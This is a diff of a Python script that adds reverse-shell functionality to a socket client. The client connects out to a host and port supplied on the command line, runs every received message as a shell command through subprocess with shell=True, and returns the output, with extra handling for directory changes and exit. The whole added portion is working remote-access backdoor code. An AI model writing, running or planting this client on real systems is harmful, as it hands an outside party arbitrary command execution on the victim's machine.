@@ -1,32 +1,81 @@
 import socket
+import subprocess
+import os
+import sys
 
 def session_handler():
     print(f'[+] Connecting to {host_ip}.')
     sock.connect((host_ip, host_port))
     print(f'[+] Connected to {host_ip}.')
     
-    
     while True:
         try:
-            #decode encoded message
-            print("[+] Awaiting Response from server #>")
+            message = inbound()
+            # exit handling
+            if message == 'exit':
+                print("[-] The server has terminated connection")
+                sock.close()
+                break
+            #######################
+            # Change directory handling
+            #######################
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ") [1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f'[+] Changed to {cur_dir}')
+                    sock.send(cur_dir.encode())
+                except FileNotFoundError:
+                    outbound('Invalid Directory. Try again.')
+                    continue
+            #######################
+            # Display Ascii Message
+            #######################
+            elif message.split(" ")[0] == 'Message':
+                print(message)
+                sock.send("Confirmation".encode())
+            #######################
+            # Basic Command handling
+            #######################
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                sock.send(output)
+       
+            ####
+            # Catch and print failures
+            ####
+        except Exception as fail:
+            print(f"[-] Closing ... Exception caught {fail}")
+            sock.close()
+            break
+        
+
+def inbound():
+    print('[+] Awaiting response...')
+    message = ''
+    while True:
+        try:
             message = sock.recv(1024).decode()
-            print(message)
-            response = input('Message to send#> ')
-            sock.send(response.encode())
-        except Exception:
+            return message
+        except Exception as fail:
+            print(f"[-] Closing ... Exception caught {fail}")
+            outbound(fail)
             sock.close()
             break
 
-# socket.AF_INET = IPV4 address family used in sockets where we will be referring
-# to socket connections through a host IP and port address scheme (AF_INET6 would refer to IPV6)
+def outbound(message):
+    response = str(message).encode()
+    sock.send(response)
 
-# SOCK_STREAM = communication channel that allows communications to occur from one point to another
-#       Until that communication is terminated
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-host_ip = '127.0.0.1'
-host_port = 2222
 
-# call session_handler
-#
-session_handler()
+
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    host_ip = sys.argv[1]
+    host_port = int(sys.argv[2])
+
+    # call session_handler
+    #
+    session_handler()
